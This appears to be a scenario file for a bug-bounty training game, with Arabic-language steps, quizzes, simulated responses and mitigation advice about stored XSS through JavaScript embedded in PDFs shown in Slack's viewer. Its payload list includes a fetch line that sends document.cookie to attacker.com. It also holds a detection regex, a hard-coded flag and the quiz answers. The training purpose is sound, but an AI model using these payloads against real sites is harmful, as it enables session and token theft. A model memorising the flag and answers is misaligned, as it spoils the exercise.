// ==========================================================
// SCENARIO 002: STORED XSS IN PDF VIEWER - SLACK COMPROMISE
// ==========================================================

window.scenario_002 = {
  "metadata": {
    "id": "scenario-002",
    "title": "Stored XSS in PDF Viewer - Slack Compromise",
    "level": "Easy",
    "category": "API Security",
    "company": "Slack",
    "reward": "$5,000",
    "time": "1 Hour"
  },
  "decisionLog": [
    {
      "hypothesis": "ملفات PDF هي ملفات نصية جامدة لا تحتوي على أي كود برمجي تفاعلي.",
      "whyFailed": "ملفات PDF تدعم إدراج كود JavaScript (Acrobat JS) الذي يتم تنفيذه في بعض القراء.",
      "planB": "إنشاء ملف PDF يحتوي على كود XSS واختبار تشغيله داخل المعاين الخاص بالمنصة.",
      "ignored": "البحث عن ثغرات SQLi في صفحة رفع الملفات."
    }
  ],
  "payloads": [
    {
      "code": "app.alert(\"XSS in Slack! Domain: \" + document.URL);",
      "explanation": "أمر JavaScript مدمج بداخل هيكلية ملف الـ PDF.",
      "whyWorked": "يقوم متصفح الـ PDF بقراءة كود الـ JS وتنفيذه داخل سياق الموقع دون فلترة.",
      "alternatives": [
        "alert(document.domain)",
        "fetch('https://attacker.com/steal?c=' + document.cookie)"
      ]
    }
  ],
  "mistakes": [
    {
      "mistake": "محاولة رفع كود PHP مباشر في حقل رفع الصور.",
      "whyWrong": "الخادم يطبق فلترة صارمة على الامتدادات ويسمح بـ PDF فقط.",
      "betterWay": "الاستفادة من الامتداد المسموح وتضمين الكود بداخله."
    }
  ],
  "steps": [
    {
      "name": "Mission Brief",
      "time": "09:00",
      "workspace": "markdown",
      "xpReward": 100,
      "description": "### 🎯 الهدف: فحص منصة Slack (معاين ملفات PDF)\n\nمرحباً بك! منصة Slack تسمح بمشاركة الملفات وعرض ملفات PDF داخل المتصفح مباشرة دون تحميلها لتسهيل القراءة.\n\n#### قواعد الفحص:\n- استكشف آلية عرض ملفات PDF لمعرفة ما إذا كانت تدعم JavaScript داخلياً.\n- حاول استغلال الثغرة لإثبات القدرة على تنفيذ كود برمجى (Stored XSS) نيابة عن المستخدم الضحية.\n\nاضغط على **Next Step** للبدء.",
      "aiAdvisor": {
        "hint": "تحقق من كيفية معالجة ملفات PDF في المتصفح.",
        "payloadExplanation": "لا توجد أكواد مطلوبة هنا.",
        "failureExplanation": "تابع للخطوة التالية."
      }
    },
    {
      "name": "Passive Recon",
      "time": "09:15",
      "workspace": "recon",
      "xpReward": 150,
      "description": "### 🔍 فحص البيانات الوصفية للملف (Metadata)\n\nنحتاج أولاً لفحص البنية وهل نستطيع معالجة ملفات PDF وتعديلها محلياً.\nاختر الأداة المناسبة لتشغيلها.",
      "aiAdvisor": {
        "hint": "شغّل أداة pdfinfo للتأكد من هيكلية كود الـ JS داخل الملف.",
        "payloadExplanation": "pdfinfo تعرض معلومات الملف وهل يحتوي على أكواد تفاعلية.",
        "failureExplanation": "فشل فحص الملف محلياً قد يجعلك ترفع ملفاً تالفاً."
      }
    },
    {
      "name": "Burp Verification",
      "time": "09:40",
      "workspace": "burp",
      "xpReward": 200,
      "description": "### 🌐 رفع ملف الـ PDF الضار\n\nسنقوم الآن برفع الملف `xss.pdf` عبر الطلب المعتاد ومراقبته.\nاضغط على **Upload Malicious PDF** لمشاهدة استجابة التطبيق وتنفيذ كود الـ XSS.",
      "burpRequest": "POST /api/files.upload HTTP/1.1\nHost: slack.com\nContent-Type: multipart/form-data; boundary=----Boundary\n\n------Boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"normal.pdf\"\nContent-Type: application/pdf\n\n%PDF-1.4\n[Normal PDF Binary Content]\n------Boundary--",
      "burpResponse": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"ok\": true,\n  \"file_id\": \"F99999SAFE\",\n  \"url_private\": \"https://slack.com/files/F99999SAFE/view\"\n}",
      "aiAdvisor": {
        "hint": "اضغط على زر Upload Malicious PDF لتأكيد إمكانية الرفع والتنفيذ.",
        "payloadExplanation": "الطلب يرسل الملف إلى الواجهة التي تعرضه محلياً في iframe.",
        "failureExplanation": "تأكد من إتمام الرفع بنجاح."
      }
    },
    {
      "name": "Exploitation & Flag",
      "time": "10:05",
      "workspace": "lab",
      "xpReward": 300,
      "instructions": "استلم الـ Flag بعد تأكيد قراءة كود الـ JavaScript بنجاح داخل الـ PDF Viewer.",
      "targetUrl": "https://slack.com/files/F12345/view",
      "correctFlag": "FLAG{stored_xss_in_pdf_viewer_slack}",
      "aiAdvisor": {
        "hint": "أدخل العلم الصحيح: FLAG{stored_xss_in_pdf_viewer_slack}",
        "payloadExplanation": "التأكيد على تنفيذ الكود بنجاح.",
        "failureExplanation": "الرجاء كتابة الحروف كاملة وبشكل صحيح."
      }
    },
    {
      "name": "Report Writing",
      "time": "10:30",
      "workspace": "report",
      "xpReward": 250,
      "aiAdvisor": {
        "hint": "الكلمات المفتاحية المطلوبة هي 'xss' و 'pdf'.",
        "payloadExplanation": "شرح كيفية استغلال معاين الـ PDF لتنفيذ XSS.",
        "failureExplanation": "تجنب نسيان الكلمات المفتاحية."
      }
    },
    {
      "name": "Triage & Verdict",
      "time": "14 Days Later",
      "workspace": "review",
      "aiAdvisor": {
        "hint": "انظر النتيجة وقبول الثغرة.",
        "payloadExplanation": "سيتم تقييم الخطورة بـ High لأنها تسمح بتنفيذ كود بالمتصفح.",
        "failureExplanation": "لا يوجد."
      }
    },
    {
      "name": "Lessons Learned",
      "time": "Post-Incident",
      "workspace": "quiz",
      "quizData": [
        {
          "question": "لماذا يحدث XSS في قارئ الـ PDF؟",
          "options": [
            "لأن الخادم لا يتحقق من اسم الملف.",
            "لأن قارئ الـ PDF المدمج بالمتصفح يدعم ويقوم بتنفيذ كود JavaScript مضمن بالملف دون قيود كافية.",
            "بسبب استخدام بروتوكول HTTPS.",
            "بسبب تسريب كود المصدر."
          ],
          "answer": 1
        },
        {
          "question": "كيف يمكن منع هذه الثغرة نهائياً؟",
          "options": [
            "تغيير امتداد الملفات إلى JPG.",
            "عرض ملفات PDF في سياق معزول تماماً (Sandbox) أو إجبار المستخدم على تحميل الملف بدلاً من عرضه بالمتصفح.",
            "استخدام جدار حماية للتطبيقات (WAF) فقط.",
            "حظر استخدام المتصفحات الحديثة."
          ],
          "answer": 1
        }
      ],
      "aiAdvisor": {
        "hint": "الإجابة لكلا السؤالين هي الخيار الثاني (ب).",
        "payloadExplanation": "تثبيت المفاهيم الأساسية لأمان رفع وعرض الملفات.",
        "failureExplanation": "التركيز مطلوب لتجنب خسارة النقاط."
      }
    }
  ],
  "realReport": {
    "title": "Stored XSS via PDF File Upload in slack.com PDF viewer",
    "severity": "High",
    "type": "XSS",
    "desc": "The PDF Viewer component in Slack implements a rendering frame that does not sanitize or restrict execution of embedded Acrobat JavaScript actions. By uploading a crafted PDF containing arbitrary JavaScript, an attacker can execute code under the slack.com origin.",
    "steps": "1. Upload a PDF file with embedded JavaScript actions.\n2. Open the private file viewer link.\n3. The browser triggers the JavaScript alert dialog.",
    "impact": "Account takeover, CSRF, and token theft on users visiting the uploaded document.",
    "feedback": "Great report. Slack PDF viewer sandbox was updated to disable JavaScript execution. Bounty awarded.",
    "keywords": [
      "xss",
      "pdf"
    ]
  },
  "writeup": {
    "description": "ملفات PDF تدعم معيار **Acrobat JavaScript** الذي يسمح بتضمين أكواد JS داخل الملف. معظم قرّاء الـ PDF الحديثة تشغّل هذه الأكواد. حين يعرض Slack ملفات PDF داخل `<iframe>` بنفس الـ origin، يُنفَّذ الكود في سياق `slack.com` مباشرة.",
    "payloadAnalysis": "الـ payload يتضمن `app.alert(document.domain)` كأمر Acrobat JS. عند تشغيله يُظهر نافذة بعنوان `slack.com` دليلاً على تنفيذ XSS بالـ origin الصحيح. يمكن تطوير الهجوم لسرقة الـ cookies أو الـ session tokens.",
    "impact": "**High** — يمكن تحويله لـ Account Takeover كامل عبر سرقة token الجلسة أو إعادة استخدام `document.cookie`.",
    "mitigation": "```nginx\n# Add Content-Security-Policy header\nadd_header Content-Security-Policy \"sandbox allow-scripts allow-forms; default-src 'none';\";\n\n# Force PDF download instead of inline rendering\nadd_header Content-Disposition \"attachment\";\n```\n\n```javascript\n// Server-side: Use PDF sanitizer library\nconst { PDFDocument } = require('pdf-lib');\nasync function sanitizePDF(buffer) {\n  // Strip JavaScript actions from PDF\n  const pdf = await PDFDocument.load(buffer);\n  // Remove OpenAction and AA dictionary entries\n  pdf.catalog.delete(PDFName.of('OpenAction'));\n  pdf.catalog.delete(PDFName.of('AA'));\n  return await pdf.save();\n}\n```"
  },
  simulateTerminal(command) {
    const cmd = command.trim();
    if (cmd.startsWith("dirsearch")) {
      return {
        output: [
          { text: "[INF] Starting dirsearch on slack.com...", type: "info" },
          { text: "No interesting paths found with 403 or 200.", type: "error" }
        ],
        correct: false,
        outcome: "البحث عن مسارات غير مفيد هنا. ركز على فحص ملف الـ PDF محلياً باستخدام pdfinfo."
      };
    } else if (cmd.startsWith("pdfinfo xss.pdf") || cmd.startsWith("pdfinfo")) {
      return {
        output: [
          { text: "Title: Test PDF for XSS", type: "out" },
          { text: "Pages: 1", type: "out" },
          { text: "Encrypted: no", type: "out" },
          { text: "PDF version: 1.4", type: "out" },
          { text: "[!] Notice: Detected Embedded JavaScript actions in PDF Catalog!", type: "success" }
        ],
        correct: true,
        evidence: { title: "Embedded Javascript in PDF", content: "JavaScript: Yes\nPayload: app.alert('Stored XSS')" },
        outcome: "ممتاز! أداة pdfinfo أظهرت أن الملف يحتوي على كود JavaScript تفاعلي مدمج بداخله. يمكننا الآن رفعه للمنصة."
      };
    } else {
      return {
        output: [
          { text: `Command not found or not useful: ${cmd}`, type: "error" },
          { text: "Try using 'pdfinfo xss.pdf' to inspect the local malicious payload.", type: "info" }
        ],
        correct: false
      };
    }
  },

  simulateBackend(requestText, bodyJson) {
    const parsed = window.HttpRequestParser.parse(requestText);
    const builder = new window.HttpResponseBuilder();

    // Handle PDF file upload
    if (parsed.method === 'POST' && parsed.path.includes('files.upload')) {
      // Check if body contains PDF with JavaScript
      const hasJS = /app\.alert|javascript:|alert\s*\(|document\.cookie|fetch\s*\(/i.test(requestText);
      const hasPDF = /pdf|%PDF|application\/pdf/i.test(requestText);

      if (!hasPDF) {
        return builder
          .setStatus(400)
          .setBody({ ok: false, error: "invalid_file_type: Only PDF files are accepted in this channel." })
          .setObservabilityLog("[INFO] File Upload Handler: Received file upload request.\n[WARN] Content-Type validation: Submitted file extension or MIME type is not PDF.\n[INFO] Upload rejected.")
          .setOutcome("ملف ليس من نوع PDF. استخدم امتداد PDF صحيح وتحقق من نوع المحتوى.")
          .build();
      }

      if (hasJS) {
        return builder
          .setStatus(200)
          .setBody({
            ok: true,
            file_id: "F12345XSS",
            url_private: "https://slack.com/files/F12345XSS/view",
            url_private_download: "https://files.slack.com/files-pri/T01/F12345XSS/xss.pdf",
            message: "File uploaded successfully"
          })
          .setCorrect(true)
          .setEvidence("Malicious PDF Uploaded", "POST /api/files.upload -> File F12345XSS stored with embedded Acrobat JavaScript")
          .setObservabilityLog("[INFO] Upload Handler: Received multipart/form-data file upload.\n[INFO] MIME check: application/pdf -> PASS\n[WARN] PDF Content Analyzer: Embedded JavaScript action detected in PDF Catalog.\n[CRITICAL] Security: JavaScript in PDF was NOT sanitized before storage. File stored with ID F12345XSS.\n[INFO] Response: 200 OK - File stored and preview link generated.")
          .setOutcome("تم رفع الـ PDF الضار بنجاح! المنصة قبلت الملف دون فحص محتوى JavaScript المدمج. الآن اذهب للرابط المرجع لرؤية الـ XSS يتنفذ.")
          .build();
      } else {
        return builder
          .setStatus(200)
          .setBody({ ok: true, file_id: "F99999SAFE", url_private: "https://slack.com/files/F99999SAFE/view" })
          .setObservabilityLog("[INFO] Upload Handler: PDF file received and stored successfully.\n[INFO] No embedded JavaScript detected in document.")
          .setOutcome("تم رفع الـ PDF بنجاح لكنه لا يحتوي على JavaScript. أضف payload XSS مثل `app.alert(document.domain)` داخل الملف.")
          .build();
      }
    }

    // Handle PDF viewer request
    if (parsed.method === 'GET' && parsed.path.includes('files/F12345XSS/view')) {
      return builder
        .setStatus(200)
        .setBody('<html><head><script>alert(document.domain);</script></head><body>[PDF Viewer Frame - Executing Embedded Acrobat JS]</body></html>')
        .setHeader('Content-Type', 'text/html')
        .setCorrect(true)
        .setObservabilityLog("[INFO] File Viewer: User accessed file F12345XSS view link.\n[INFO] Renderer: Loading PDF in iframe under origin slack.com\n[CRITICAL] XSS Triggered: Acrobat JavaScript executed: alert(document.domain) -> 'slack.com'\n[CRITICAL] Origin: JavaScript ran under slack.com context - Full XSS Confirmed!")
        .setOutcome("XSS تنفّذ بنجاح داخل معاين الـ PDF! الكود يعمل تحت origin الموقع مباشرة. هذا يؤكد إمكانية سرقة الـ cookies والـ tokens الحساسة.")
        .build();
    }

    // Fallback
    return builder
      .setStatus(404)
      .setBody({ error: "Endpoint not recognized. Use POST /api/files.upload to upload a malicious PDF." })
      .setObservabilityLog(`[WARN] Router: Unrecognized path "${parsed.path}" for method "${parsed.method}".\n[INFO] Allowed: POST /api/files.upload | GET /files/{id}/view`)
      .setOutcome("المسار غير صحيح. استخدم POST /api/files.upload لرفع ملف PDF يحتوي على JavaScript.")
      .build();
  }
};
